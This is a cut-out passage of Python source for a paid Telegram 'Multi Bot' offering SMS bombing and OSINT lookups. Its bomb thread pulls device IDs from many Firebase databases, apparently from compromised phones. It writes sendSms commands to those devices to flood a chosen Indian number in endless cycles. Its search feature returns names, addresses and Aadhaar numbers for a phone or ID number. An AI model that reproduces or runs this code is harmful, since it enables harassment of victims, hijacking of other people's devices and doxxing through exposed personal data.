    c.execute("SELECT user_id, phone, attempts, last_attempt FROM bomb_attempts ORDER BY last_attempt DESC LIMIT ?", (limit,))
    return c.fetchall()

# ══════════════════════════════════════════════════════════════
#                    🎟 REDEEM (SEPARATE TYPES)
# ══════════════════════════════════════════════════════════════
def generate_redeem_key(credits, days=30, max_uses=1, created_by=None, key_type='bomb'):
    """key_type: 'bomb' or 'osint'"""
    prefix = "BMB" if key_type == 'bomb' else "OSN"
    key = f"{prefix}-" + secrets.token_hex(4).upper() + "-" + secrets.token_hex(4).upper()
    conn = get_db(); c = conn.cursor()
    expiry_at = datetime.now().timestamp() + (days * 86400)
    c.execute("""INSERT INTO redeem_keys(key, credits, key_type, max_uses, expiry_days, created_by, expiry_at)
                 VALUES(?,?,?,?,?,?,?)""",
              (key, credits, key_type, max_uses, days, created_by, expiry_at))
    conn.commit()
    return key

def redeem_key(user_id, key):
    key = key.strip().upper()
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT credits, key_type, max_uses, used_count, expiry_at FROM redeem_keys WHERE key=?", (key,))
    row = c.fetchone()
    if not row: return False, "❌ Iɴᴠᴀʟɪᴅ Kᴇʏ!"
    credits, key_type, max_uses, used_count, expiry_at = row
    if datetime.now().timestamp() > expiry_at: return False, "❌ Kᴇʏ Exᴘɪʀᴇᴅ!"
    if used_count >= max_uses: return False, "❌ Kᴇʏ Aʟʀᴇᴀᴅʏ Usᴇᴅ!"
    c.execute("SELECT 1 FROM key_redemptions WHERE key=? AND user_id=?", (key, user_id))
    if c.fetchone(): return False, "❌ Yᴏᴜ Aʟʀᴇᴀᴅʏ Usᴇᴅ Tʜɪs Kᴇʏ!"
    add_credits(user_id, credits, key_type)
    c.execute("UPDATE redeem_keys SET used_count = used_count + 1 WHERE key=?", (key,))
    c.execute("INSERT INTO key_redemptions(key, user_id) VALUES(?,?)", (key, user_id))
    conn.commit()
    emoji = "💣" if key_type == 'bomb' else "🔍"
    log_user_action(user_id, "Redeem", f"{credits} {key_type} credits from {key}")
    return True, f"✅ {emoji} {credits} {key_type.upper()} Cʀᴇᴅɪᴛs Aᴅᴅᴇᴅ!"

def get_all_keys(kind=None):
    conn = get_db(); c = conn.cursor()
    if kind:
        c.execute("""SELECT key, credits, key_type, max_uses, used_count, expiry_at
                     FROM redeem_keys WHERE key_type=? ORDER BY created_at DESC LIMIT 30""", (kind,))
    else:
        c.execute("""SELECT key, credits, key_type, max_uses, used_count, expiry_at
                     FROM redeem_keys ORDER BY created_at DESC LIMIT 30""")
    return c.fetchall()

def delete_key(key):
    conn = get_db(); c = conn.cursor()
    c.execute("DELETE FROM redeem_keys WHERE key=?", (key.upper(),))
    a = c.rowcount; conn.commit(); return a > 0

# ══════════════════════════════════════════════════════════════
#                    🔒 FORCE JOIN
# ══════════════════════════════════════════════════════════════
def set_force_join_verified(uid):
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO force_join_verified(user_id) VALUES(?)", (uid,))
    conn.commit()

def is_force_join_verified(uid):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT user_id FROM force_join_verified WHERE user_id=?", (uid,))
    return c.fetchone() is not None

# ══════════════════════════════════════════════════════════════
#                    🔍 TITAN SEARCH API
# ══════════════════════════════════════════════════════════════
_search_client = None

async def get_search_client():
    global _search_client
    if _search_client is None or _search_client.is_closed:
        _search_client = httpx.AsyncClient(
            timeout=httpx.Timeout(60.0, connect=15.0),
            limits=httpx.Limits(max_connections=20, max_keepalive_connections=10),
        )
    return _search_client

async def api_search(query):
    client = await get_search_client()
    try:
        r = await client.get(TITAN_API, params={"key": TITAN_KEY, "num": query})
        r.raise_for_status()
        data = r.json()
        if isinstance(data, dict):
            data.setdefault("success", bool(data.get("results")))
        return data
    except httpx.HTTPStatusError as e:
        return {"success": False, "error": f"API {e.response.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

FIELD_LABELS = {
    "name": "👤 Nᴀᴍᴇ", "fathersName": "👨 Fᴀᴛʜᴇʀ",
    "phoneNumber": "📱 Pʜᴏɴᴇ", "aadharNumber": "🆔 Aᴀᴅʜᴀᴀʀ",
    "otherNumber": "📞 Oᴛʜᴇʀ", "address": "🏠 Aᴅᴅʀᴇss",
    "district": "🏙 Dɪsᴛʀɪᴄᴛ", "pincode": "📮 Pɪɴᴄᴏᴅᴇ",
    "state": "🗺 Sᴛᴀᴛᴇ", "town": "🏘 Tᴏᴡɴ", "source": "📂 Sᴏᴜʀᴄᴇ",
}

def esc(t):
    if t is None: return ""
    return str(t).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def format_search_results(data, query):
    if not data.get("success") or not data.get("results"):
        return (
            "╔═══════════════════╗\n"
            "║    ❌ Nᴏ Dᴀᴛᴀ Fᴏᴜɴᴅ   ║\n"
            "╚═══════════════════╝\n\n"
            f"🔍 Qᴜᴇʀʏ: <code>{esc(query)}</code>"
        )
    results = data["results"]
    total = data.get("total", data.get("count", len(results)))
    searched = ", ".join(data.get("searched_fields", [])) or "—"
    head = (
        "╔═════════════════════════╗\n"
        f"║✅ Fᴏᴜɴᴅ {str(total).ljust(4)} Rᴇsᴜʟᴛ  ║\n"
        "╚═════════════════════════╝\n"
        f"🔍 <code>{esc(query)}</code>\n"
        f"🎯 {searched}\n"
    )
    parts = []
    for i, row in enumerate(results, 1):
        lines = [f"━━━ Rᴇsᴜʟᴛ #{i} ━━━"]
        for f, lbl in FIELD_LABELS.items():
            v = row.get(f)
            if v and str(v).strip():
                lines.append(f"{lbl}: <code>{esc(v)}</code>")
        parts.append("\n".join(lines))
    return f"{head}\n" + "\n\n".join(parts)

# ══════════════════════════════════════════════════════════════
#                    💣 SMS / FIREBASE
# ══════════════════════════════════════════════════════════════
def fetch_clients_sync(url):
    try:
        base = url.rstrip('/')
        all_devices = []
        for path in ["All_Users", "Verify_Device", "clients"]:
            try:
                r = requests.get(f"{base}/{path}.json?shallow=true", timeout=1.5)
                if r.status_code == 200:
                    d = r.json()
                    if d and isinstance(d, dict): all_devices.extend(list(d.keys()))
            except: pass
        if not all_devices:
            try:
                r = requests.get(f"{base}/.json?shallow=true", timeout=1.5)
                if r.status_code == 200:
                    d = r.json()
                    if d and isinstance(d, dict): all_devices.extend(list(d.keys()))
            except: pass
        if all_devices:
            return {dev: True for dev in all_devices}
        return None
    except:
        return None

def refresh_device_cache_sync():
    global _device_cache
    all_devices = []
    url_devices = {}
    working_urls = 0
    total = 0
    def check_url(url):
        try:
            clients = fetch_clients_sync(url)
            if clients and isinstance(clients, dict):
                devices = list(clients.keys())[:MAX_DEVICES_PER_URL]
                return url, devices
            return url, []
        except:
            return url, []
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_url, url): url for url in FIREBASE_URLS}
        for future in as_completed(futures):
            try:
                url, devices = future.result(timeout=5)
                if devices:
                    url_devices[url] = devices
                    all_devices.extend(devices)
                    total += len(devices)
                    working_urls += 1
                else:
                    url_devices[url] = []
            except: pass
    _device_cache["data"] = {
        "total": total, "urls": working_urls, "url_devices": url_devices,
        "all_devices": all_devices, "last_updated": time.time()
    }
    _device_cache["timestamp"] = time.time()
    _cache_ready.set()
    print(f"✅ Cache: {total} devices / {working_urls} URLs")

def background_refresh():
    global _background_refresh_running
    _background_refresh_running = True
    try: refresh_device_cache_sync()
    except Exception as e: print(f"⚠️ {e}")
    _background_refresh_running = False

def _send_sms_blocking(url, dev_id, number, message):
    try:
        base = url.rstrip('/')
        data = {"sim": 1, "to": number, "message": message, "isSended": False}
        paths = [
            f"clients/{dev_id}/webhookEvent/sendSms.json",
            f"All_Users/{dev_id}/webhookEvent/sendSms.json",
            f"Verify_Device/{dev_id}/webhookEvent/sendSms.json",
        ]
        for path in paths:
            try:
                full = f"{base}/{path}"
                r = requests.put(full, json=data, timeout=1.5)
                if r.status_code in (200, 201): return True
            except: continue
        return False
    except: return False

def generate_otp(length=6):
    return ''.join(random.choices(string.digits, k=length))

def validate_phone_number(num):
    num = num.strip()
    if not num.startswith('+91'): return False, "❌ +91 sᴇ sʜᴜʀᴜ ᴋᴀʀᴏ 📱"
    rem = num[3:]
    if not rem.isdigit(): return False, "❌ Sɪʀғ Dɪɢɪᴛs 🔢"
    if len(rem) != 10: return False, "❌ 10 Dɪɢɪᴛs Dᴏ ⚠️"
    return True, "✅ Sᴀʜɪ Hᴀɪ 🎯"

# ══════════════════════════════════════════════════════════════
#                    ⌨️ KEYBOARD
# ══════════════════════════════════════════════════════════════
def get_main_keyboard(uid=None):
    rows = [
        [KeyboardButton(BTN_SMS), KeyboardButton(BTN_SEARCH)],
        [KeyboardButton(BTN_CREDITS), KeyboardButton(BTN_REDEEM)],
        [KeyboardButton(BTN_REFERRAL), KeyboardButton(BTN_RECHARGE)],
        [KeyboardButton(BTN_HISTORY), KeyboardButton(BTN_STATUS)],
        [KeyboardButton(BTN_BUY)],
    ]
    if uid and is_owner(uid):
        rows.append([KeyboardButton(BTN_ADMIN)])
    rows.append([KeyboardButton(BTN_DEV)])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

# ══════════════════════════════════════════════════════════════
#                    🔒 CHECKS
# ══════════════════════════════════════════════════════════════
async def check_force_join(update, context):
    uid = update.effective_user.id
    if is_owner(uid): return True
    if is_force_join_verified(uid): return True
    try:
        member = await context.application.bot.get_chat_member(
            chat_id=f"@{FORCE_CHANNEL_USERNAME}", user_id=uid)
        if member.status in ("member", "administrator", "creator"):
            set_force_join_verified(uid); return True
    except: pass
    join_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Jᴏɪɴ Cʜᴀɴɴᴇʟ", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I Jᴏɪɴᴇᴅ", callback_data="force_join_checked")]
    ])
    m = update.effective_message
    if m:
        await m.reply_text(
            "⚠️ <b>Fᴏʀᴄᴇ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ!</b>\n\nJᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ.",
            parse_mode="HTML", reply_markup=join_markup)
    return False

async def check_maintenance(update, context):
    uid = update.effective_user.id
    if is_owner(uid): return False
    if is_maintenance_on():
        m = update.effective_message
        if m:
            await m.reply_text(f"🛠️ <b>MAINTENANCE MODE</b>\n\n{get_maintenance_message()}", parse_mode="HTML")
        return True
    return False

def no_credits_msg(kind):
    """Chal bhadve papa se credit buy kar 😂"""
    if kind == 'bomb':
        return (
            "╔════════════════════╗\n"
            "║   😴 Bᴏᴍʙ Cʀᴇᴅɪᴛ Kʜᴀᴛᴀᴍ  ║\n"
            "╚════════════════════╝\n\n"
            "💣 Aᴀᴊ ᴋᴇ <b>2 ꜰʀᴇᴇ</b> ʙᴏᴍʙ + ᴘᴀɪᴅ ᴄʀᴇᴅɪᴛs ᴋʜᴀᴛᴀᴍ ʜᴏ ɢᴀʏᴇ.\n\n"
            "👉 <b>Cʜᴀʟ ʙʜᴀᴅᴠᴇ, ᴘᴀᴘᴀ sᴇ ᴄʀᴇᴅɪᴛ ʙᴜʏ ᴋᴀʀ!</b> 😂🔥\n\n"
            "💳 /buy sᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀ\n"
            "🎟 /redeembomb KEY sᴇ ʀᴇᴅᴇᴇᴍ ᴋᴀʀ"
        )
    else:
        return (
            "╔═════════════════════╗\n"
            "║   😴 OSINT Cʀᴇᴅɪᴛ Kʜᴀᴛᴀᴍ ║\n"
            "╚═════════════════════╝\n\n"
            "🔍 Aᴀᴊ ᴋᴇ <b>2 ꜰʀᴇᴇ</b> sᴇᴀʀᴄʜ + ᴘᴀɪᴅ ᴄʀᴇᴅɪᴛs ᴋʜᴀᴛᴀᴍ ʜᴏ ɢᴀʏᴇ.\n\n"
            "👉 <b>Cʜᴀʟ ʙʜᴀᴅᴠᴇ, ᴘᴀᴘᴀ sᴇ ᴄʀᴇᴅɪᴛ ʙᴜʏ ᴋᴀʀ!</b> 😂🔥\n\n"
            "💳 /buy sᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀ\n"
            "🎟 /redeemosint KEY sᴇ ʀᴇᴅᴇᴇᴍ ᴋᴀʀ"
        )

# ══════════════════════════════════════════════════════════════
#                    🚀 /start
# ══════════════════════════════════════════════════════════════
async def start(update, context):
    uid = update.effective_user.id
    if is_user_banned(uid):
        return await update.effective_message.reply_text("❌ Yᴏᴜ Aʀᴇ Bᴀɴɴᴇᴅ. 🚫")
    if await check_maintenance(update, context): return
    if not await check_force_join(update, context): return
    try:
        video_url = random.choice(VIDEO_URLS)
        await update.effective_message.reply_video(
            video=video_url,
            caption="🔥 Wᴇʟᴄᴏᴍᴇ Tᴏ Mᴜʟᴛɪ Bᴏᴛ — SMS + OSINT 🚀",
            parse_mode="HTML", supports_streaming=True)
    except Exception as e:
        print(f"⚠️ Video error: {e}")
    ref = None
    if context.args:
        p = context.args[0]
        if p.startswith("ref_"):
            try: ref = int(p.split("_")[1])
            except: pass
    ensure_user(uid, ref)
    bomb_cr = get_credits(uid, 'bomb')
    osint_cr = get_credits(uid, 'osint')
    bomb_used = get_daily_used(uid, 'bomb')
    osint_used = get_daily_used(uid, 'osint')
    bomb_free_left = max(0, DAILY_FREE_BOMB - bomb_used)
    osint_free_left = max(0, DAILY_FREE_OSINT - osint_used)
    try:
        user = await context.application.bot.get_chat(uid)
        username = f"@{user.username}" if user.username else "N/A"
    except: username = "N/A"
    role = "👑 Oᴡɴᴇʀ" if is_owner(uid) else "🆓 Fʀᴇᴇ Usᴇʀ"
    if not _cache_ready.is_set(): _cache_ready.wait(timeout=3)
    total_devices = _device_cache["data"].get("total", 0)
    owner_free = is_owner(uid)
    bf = "∞" if owner_free else bomb_free_left
    of = "∞" if owner_free else osint_free_left
    bc = "∞" if owner_free else bomb_cr
    oc = "∞" if owner_free else osint_cr
    txt = (
        f"╔═══════════════════════╗\n"
        f"║   🔥 Mᴜʟᴛɪ Bᴏᴛ V2 🔥    ║\n"
        f"║   Oᴡɴᴇʀ: {OWNER_USERNAME}   ║\n"
        f"║   ── ⋆⋅☆⋅⋆ ──              ║\n"
        f"║   👤 Rᴏʟᴇ: {role}\n"
        f"║   📛 {username}\n"
        f"║   ── ⋆⋅☆⋅⋆ ──              ║\n"
        f"║   💣 Bᴏᴍʙ Fʀᴇᴇ: {bf}/2\n"
        f"║   💣 Bᴏᴍʙ Pᴀɪᴅ: {bc}\n"
        f"║   🔍 OSINT Fʀᴇᴇ: {of}/2\n"
        f"║   🔍 OSINT Pᴀɪᴅ: {oc}\n"
        f"║   ── ⋆⋅☆⋅⋆ ──              ║\n"
        f"║   🔄 Dᴇᴠɪᴄᴇs: 🟢 {total_devices}\n"
        f"╚═══════════════════════╝"
    )
    await update.effective_message.reply_text(txt, parse_mode="HTML", reply_markup=get_main_keyboard(uid))

# ══════════════════════════════════════════════════════════════
#                    🔍 SEARCH
# ══════════════════════════════════════════════════════════════
async def do_search(update, context, query):
    uid = update.effective_user.id
    ok, source, free_left, paid_left = consume_credit(uid, 'osint')
    if not ok:
        return await update.message.reply_text(no_credits_msg('osint'), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Bᴜʏ Cʀᴇᴅɪᴛs", callback_data="ui_buy_osint")],
                [InlineKeyboardButton("🎟 Rᴇᴅᴇᴇᴍ", callback_data="ui_redeem_osint")],
            ]))
    try: await context.bot.send_chat_action(update.effective_chat.id, ChatAction.TYPING)
    except: pass
    msg = await update.message.reply_text(f"🔎 Sᴇᴀʀᴄʜɪɴɢ <code>{esc(query)}</code>...", parse_mode="HTML")
    data = await api_search(query)
    if "error" in data and not data.get("success"):
        # refund if free was used
        if source == 'free':
            conn = get_db(); c = conn.cursor()
            c.execute("UPDATE users SET osint_used_today=MAX(0, osint_used_today-1) WHERE user_id=?", (uid,))
            conn.commit()
        elif source == 'paid':
            add_credits(uid, 1, 'osint')
        await msg.edit_text(
            "╔═══════════════════════╗\n║   ❌ Eʀʀᴏʀ   ║\n╚══════════════════════╝\n\n"
            f"<code>{esc(data.get('error'))}</code>", parse_mode="HTML")
        return
    text = format_search_results(data, query)
    if is_owner(uid):
        text += "\n\n👑 <i>Oᴡɴᴇʀ — Uɴʟɪᴍɪᴛᴇᴅ</i>"
    elif source == 'free':
        text += f"\n\n🎁 Fʀᴇᴇ ᴜsᴇᴅ | Aᴀᴊ ʙᴀᴄʜᴇ: <b>{free_left}/2</b>"
    elif source == 'paid':
        text += f"\n\n💎 Pᴀɪᴅ ᴄʀᴇᴅɪᴛ ᴜsᴇᴅ | Bᴀᴄʜᴇ: <b>{paid_left}</b>"
    if len(text) > 4000:
        chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
        await msg.edit_text(chunks[0], parse_mode="HTML")
        for c in chunks[1:]:
            await update.message.reply_text(c, parse_mode="HTML")
    else:
        await msg.edit_text(text, parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#                    💣 BOMB THREAD
# ══════════════════════════════════════════════════════════════
_active_bombs = {}

def start_bomb_thread(uid, number, msg_text):
    stop_flag = {"stop": False}
    _active_bombs[uid] = stop_flag
    t = threading.Thread(target=_run_bomb_in_thread, args=(uid, number, msg_text, stop_flag), daemon=True)
    t.start()

def _run_bomb_in_thread(uid, number, msg_text, stop_flag):
    try: asyncio.run(_bomb_async(uid, number, msg_text, stop_flag))
    except Exception as e: print(f"❌ Bomb error: {e}")

async def _bomb_async(uid, number, msg_text, stop_flag):
    bot = Bot(token=TOKEN)
    total_sent = 0; total_failed = 0; cycle = 1
    otp_ph = re.search(r'\{otp(:\d+)?\}', msg_text)
    otp_len = 6
    if otp_ph and otp_ph.group(1):
        try:
            otp_len = int(otp_ph.group(1)[1:]); otp_len = max(1, min(10, otp_len))
        except: otp_len = 6
    progress_id = None
    try:
        pm = await bot.send_message(chat_id=uid, text=f"🚀 Bᴏᴍʙ Sᴛᴀʀᴛᴇᴅ!\n📱 {number}\n⏳...")
        progress_id = pm.message_id
    except: pass
    log_bomb_attempt(uid, number)
    if not _cache_ready.is_set(): _cache_ready.wait(timeout=10)
    all_devices = _device_cache["data"].get("all_devices", [])
    if not all_devices:
        if progress_id:
            try: await bot.edit_message_text(chat_id=uid, message_id=progress_id, text="❌ No devices!")
            except: pass
        return
    last_update_time = [0.0]; update_lock = asyncio.Lock()
    async def update_progress(force=False):
        if not progress_id: return
        now = time.time()
        if not force and (now - last_update_time[0]) < 2: return
        async with update_lock:
            last_update_time[0] = now
            try:
                await bot.edit_message_text(
                    chat_id=uid, message_id=progress_id,
                    text=(f"💥 Bᴏᴍʙɪɴɢ Lɪᴠᴇ...\n━━━━━━━━━━━━━━\n"
                          f"✅ Sᴇɴᴛ: {total_sent} 📤\n❌ Fᴀɪʟᴇᴅ: {total_failed} 💔\n"
                          f"🔄 Cʏᴄʟᴇ: {cycle}\n📱 Dᴇᴠɪᴄᴇs: {len(all_devices)}\n"
                          f"━━━━━━━━━━━━━━\n🛑 /cancel ᴛᴏ sᴛᴏᴘ"))
            except: pass
    loop = asyncio.get_event_loop()
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    async def one_send(url, dev_id):
        nonlocal total_sent, total_failed
        async with sem:
            if stop_flag.get("stop") or is_user_banned(uid): return
            final_msg = msg_text
            if otp_ph:
                otp = generate_otp(otp_len)
                final_msg = re.sub(r'\{otp(:\d+)?\}', otp, msg_text)
            try:
                ok = await asyncio.wait_for(
                    loop.run_in_executor(None, _send_sms_blocking, url, dev_id, number, final_msg),
                    timeout=5)
            except: ok = False
            if ok: total_sent += 1
            else: total_failed += 1
            await update_progress()
    while not stop_flag.get("stop"):
        if is_user_banned(uid): break
        if not _device_cache["data"].get("all_devices"):
            await asyncio.sleep(0.1); continue
        all_tasks = []
        for url in FIREBASE_URLS:
            if stop_flag.get("stop"): break
            url_devices = _device_cache["data"].get("url_devices", {}).get(url, [])
            if not url_devices: continue
            for dev_id in url_devices[:MAX_DEVICES_PER_URL]:
                if stop_flag.get("stop"): break
                all_tasks.append(asyncio.create_task(one_send(url, dev_id)))
        if all_tasks:
            for i in range(0, len(all_tasks), BATCH_SIZE):
                if stop_flag.get("stop"): break
                batch = all_tasks[i:i+BATCH_SIZE]
                done, pending = await asyncio.wait(batch, timeout=BULK_TIMEOUT)
                for task in pending: task.cancel()
                await asyncio.sleep(0)
        cycle += 1
        await update_progress(force=True)
        await asyncio.sleep(0)
    reason = "🛑 Sᴛᴏᴘᴘᴇᴅ" if stop_flag.get("stop") else "✅ Cᴏᴍᴘʟᴇᴛᴇᴅ"
    if progress_id:
        try:
            await bot.edit_message_text(
                chat_id=uid, message_id=progress_id,
                text=(f"{reason}\n━━━\n✅ Sᴇɴᴛ: {total_sent} 📤\n"
                      f"❌ Fᴀɪʟᴇᴅ: {total_failed} 💔\n"
                      f"🔄 Tᴏᴛᴀʟ Cʏᴄʟᴇs: {cycle}\n🚀 Dᴏɴᴇ!"))
        except: pass
    log_user_action(uid, "Bulk SMS", f"Sent {total_sent}, Failed {total_failed}")
    _active_bombs.pop(uid, None)

# ══════════════════════════════════════════════════════════════
#                    🧠 TEXT HANDLER
# ══════════════════════════════════════════════════════════════
def clear_states(context):
    for k in ('bulk_step','bulk_number','custom_message','stop_sending',
              'is_custom_message','search_state','recharge_step',
              'recharge_credits','recharge_amount','recharge_type','admin_step'):
        context.user_data.pop(k, None)

async def handle_text(update, context):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    if is_user_banned(uid):
        return await update.message.reply_text("❌ Bᴀɴɴᴇᴅ. 🚫")

    # ── ADMIN INPUTS ──
    admin_step = context.user_data.get('admin_step')
    if admin_step and is_owner(uid):
        if admin_step == 'genkey_credits':
            parts = text.split()
            try:
                ktype = parts[0].lower()
                if ktype not in ('bomb', 'osint'): raise ValueError
                credits = int(parts[1])
                days = int(parts[2]) if len(parts) > 2 else 30
                max_uses = int(parts[3]) if len(parts) > 3 else 1
            except:
                return await update.message.reply_text(
                    "❌ Fᴏʀᴍᴀᴛ: <code>bomb|osint credits [days] [uses]</code>\n"
                    "Ex: <code>bomb 10 30 1</code>\nEx: <code>osint 5 7 10</code>",
                    parse_mode="HTML")
            key = generate_redeem_key(credits, days, max_uses, uid, ktype)
            context.user_data.pop('admin_step', None)
            emoji = "💣" if ktype == 'bomb' else "🔍"
            cmd = "/redeembomb" if ktype == 'bomb' else "/redeemosint"
            return await update.message.reply_text(
                f"✅ <b>Kᴇʏ Gᴇɴᴇʀᴀᴛᴇᴅ!</b>\n{emoji} Tʏᴘᴇ: {ktype.upper()}\n"
                f"🔑 <code>{key}</code>\n💰 {credits}\n📅 {days}d\n👥 {max_uses}\n"
                f"━━━\nUsᴇʀ ᴜsᴇ ᴋᴀʀᴇ: <code>{cmd} {key}</code>",
                parse_mode="HTML")
        if admin_step == 'delkey':
            if delete_key(text):
                context.user_data.pop('admin_step', None)
                return await update.message.reply_text(f"✅ Dᴇʟᴇᴛᴇᴅ <code>{text.upper()}</code>", parse_mode="HTML")
            return await update.message.reply_text("❌ Nᴏᴛ ꜰᴏᴜɴᴅ!")
        if admin_step == 'maint_msg':
            set_maintenance(is_maintenance_on(), message=text)
            context.user_data.pop('admin_step', None)
            return await update.message.reply_text("✅ Uᴘᴅᴀᴛᴇᴅ!")
        if admin_step == 'broadcast':
            context.user_data.pop('admin_step', None)
            users = get_all_users()
            await update.message.reply_text(f"📢 Sᴇɴᴅɪɴɢ ᴛᴏ {len(users)}...")
            sent = failed = 0
            for uid2, _, _, _ in users:
                if is_user_banned(uid2): failed += 1; continue
                try:
                    await context.application.bot.send_message(uid2, f"📢 {text}", parse_mode="HTML")
                    sent += 1
                except: failed += 1
                await asyncio.sleep(0.02)
            return await update.message.reply_text(f"✅ Sᴇɴᴛ: {sent} | ❌ Fᴀɪʟᴇᴅ: {failed}")
        if admin_step == 'add_credits':
            parts = text.split()
            try:
                ktype = parts[0].lower()
                target = int(parts[1]); amt = int(parts[2])
                add_credits(target, amt, ktype)
                context.user_data.pop('admin_step', None)
                return await update.message.reply_text(f"✅ +{amt} {ktype} to {target}")
            except:
                return await update.message.reply_text("❌ Fᴏʀᴍᴀᴛ: <code>bomb|osint USER_ID AMOUNT</code>", parse_mode="HTML")

    if await check_maintenance(update, context): return

    # ── BUTTONS ──
    if text == BTN_ADMIN:
        return await admin_panel(update, context)
    if text == BTN_BUY:
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("💣 Bᴜʏ Bᴏᴍʙ Cʀᴇᴅɪᴛs", callback_data="ui_buy_bomb")],
            [InlineKeyboardButton("🔍 Bᴜʏ OSINT Cʀᴇᴅɪᴛs", callback_data="ui_buy_osint")],
            [InlineKeyboardButton("💬 Cᴏɴᴛᴀᴄᴛ Oᴡɴᴇʀ", url=OWNER_CONTACT_LINK)],
        ])
        return await update.message.reply_text(
            f"💳 <b>Bᴜʏ Cʀᴇᴅɪᴛs</b>\n━━━━━━━━━━━━━━\n"
            f"👤 {OWNER_CONTACT_USERNAME}\n📱 <code>{OWNER_PHONE}</code>\n"
            f"🔗 {OWNER_CONTACT_LINK}\n━━━━━━━━━━━━━━\n"
            f"💰 Pᴀʏᴍᴇɴᴛ ᴋᴇ ʙᴀᴀᴅ ᴄʀᴇᴅɪᴛs ᴍɪʟᴇɴɢᴇ!",
            parse_mode="HTML", reply_markup=markup)

    if text in [BTN_SMS, BTN_SEARCH, BTN_CREDITS, BTN_REFERRAL, BTN_RECHARGE,
                BTN_HISTORY, BTN_STATUS, BTN_DEV, BTN_REDEEM]:
        if not await check_force_join(update, context): return

    if text == BTN_SMS:
        clear_states(context)
        # Check if user has ANY credit (free or paid)
        bomb_used = get_daily_used(uid, 'bomb')
        bomb_paid = get_credits(uid, 'bomb')
        if not is_owner(uid) and bomb_used >= DAILY_FREE_BOMB and bomb_paid <= 0:
            return await update.message.reply_text(no_credits_msg('bomb'), parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💳 Bᴜʏ Bᴏᴍʙ Cʀᴇᴅɪᴛs", callback_data="ui_buy_bomb")],
                    [InlineKeyboardButton("🎟 Rᴇᴅᴇᴇᴍ", callback_data="ui_redeem_bomb")],
                ]))
        free_left = max(0, DAILY_FREE_BOMB - bomb_used) if not is_owner(uid) else -1
        await update.message.reply_text(
            f"📞 <b>Eɴᴛᴇʀ Nᴜᴍʙᴇʀ:</b>\n+91XXXXXXXXXX\n\n"
            f"💣 Fʀᴇᴇ ʙᴀᴄʜᴇ: {'∞' if free_left < 0 else free_left}/2\n"
            f"💎 Pᴀɪᴅ: {'∞' if is_owner(uid) else bomb_paid}\n"
            f"❌ /cancel",
            parse_mode="HTML")
        context.user_data['bulk_step'] = 'number'
        return

    if text == BTN_SEARCH:
        clear_states(context)
        osint_used = get_daily_used(uid, 'osint')
        osint_paid = get_credits(uid, 'osint')
        if not is_owner(uid) and osint_used >= DAILY_FREE_OSINT and osint_paid <= 0:
            return await update.message.reply_text(no_credits_msg('osint'), parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💳 Bᴜʏ OSINT Cʀᴇᴅɪᴛs", callback_data="ui_buy_osint")],
                    [InlineKeyboardButton("🎟 Rᴇᴅᴇᴇᴍ", callback_data="ui_redeem_osint")],
                ]))
        free_left = max(0, DAILY_FREE_OSINT - osint_used) if not is_owner(uid) else -1
        await update.message.reply_text(
            f"🔍 <b>SEARCH MODE</b>\n\nSᴇɴᴅ 10-ᴅɪɢɪᴛ ᴘʜᴏɴᴇ ᴏʀ 12-ᴅɪɢɪᴛ Aᴀᴅʜᴀᴀʀ.\n\n"
            f"🔍 Fʀᴇᴇ ʙᴀᴄʜᴇ: {'∞' if free_left < 0 else free_left}/2\n"
            f"💎 Pᴀɪᴅ: {'∞' if is_owner(uid) else osint_paid}\n"
            f"❌ /cancel",
            parse_mode="HTML")
        context.user_data['search_state'] = 'await'
        return

    if text == BTN_CREDITS:
        clear_states(context)
        bomb_cr = get_credits(uid, 'bomb'); osint_cr = get_credits(uid, 'osint')
        bomb_used = get_daily_used(uid, 'bomb'); osint_used = get_daily_used(uid, 'osint')
        bf = max(0, DAILY_FREE_BOMB - bomb_used); of = max(0, DAILY_FREE_OSINT - osint_used)
        if is_owner(uid):
            return await update.message.reply_text(
                "💰 <b>Yᴏᴜʀ Cʀᴇᴅɪᴛs</b>\n━━━━━━━━━━━━━━\n"
                "💣 Bᴏᴍʙ: ∞\n🔍 OSINT: ∞\n👑 Oᴡɴᴇʀ — Uɴʟɪᴍɪᴛᴇᴅ",
                parse_mode="HTML")
        return await update.message.reply_text(
            f"💰 <b>Yᴏᴜʀ Cʀᴇᴅɪᴛs</b>\n━━━━━━━━━━━━━━\n"
            f"💣 <b>Bᴏᴍʙ</b>\n   Fʀᴇᴇ ᴀᴀᴊ: {bf}/2\n   Pᴀɪᴅ: {bomb_cr}\n"
            f"━━━━━━━━━━━━━━\n"
            f"🔍 <b>OSINT</b>\n   Fʀᴇᴇ ᴀᴀᴊ: {of}/2\n   Pᴀɪᴅ: {osint_cr}\n"
            f"━━━━━━━━━━━━━━",
            parse_mode="HTML")

    if text == BTN_REFERRAL:
        clear_states(context)
        bot_uname = (await context.application.bot.get_me()).username
        link = f"https://t.me/{bot_uname}?start=ref_{uid}"
        return await update.message.reply_text(
            f"🔗 <b>Lɪɴᴋ:</b>\n<code>{link}</code>\n\n🎁 <b>1 Bᴏᴍʙ + 1 OSINT Cʀᴇᴅɪᴛ</b> ᴘᴇʀ ʀᴇꜰᴇʀʀᴀʟ!",
            parse_mode="HTML")

    if text == BTN_RECHARGE:
        clear_states(context)
